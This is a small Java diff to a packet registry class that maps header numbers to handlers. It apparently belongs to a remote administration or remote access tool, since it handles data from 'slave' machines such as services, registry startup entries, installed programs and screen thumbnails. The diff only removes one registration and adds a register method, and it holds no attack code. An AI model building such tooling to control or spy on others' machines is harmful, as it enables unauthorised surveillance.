@@ -75,7 +75,7 @@ public class IncomingPackets {
 		PACKETS_INCOMING.put((short) 51, Packet51ActivePort.class);
 		PACKETS_INCOMING.put((short) 52, Packet52WindowsService.class);
 		PACKETS_INCOMING.put((short) 53, Packet53RegistryStartup.class);
-		PACKETS_INCOMING.put((short) 54, Packet54Registry.class);
+        //54
 		PACKETS_INCOMING.put((short) 55, Packet55InstalledProgram.class);
 		PACKETS_INCOMING.put((short) 56, Packet56NetworkAdapter.class);
 		//57
@@ -94,6 +94,10 @@ public class IncomingPackets {
 		//70
 		PACKETS_INCOMING.put((short) 71, Packet71AllThumbnails.class);
 	}
+
+	public static void register(short header, Class<? extends AbstractIncomingPacket> clazz) {
+	    PACKETS_INCOMING.put(header, clazz);
+    }
 
 	public static boolean execute(short header, Slave slave) {
 		try {
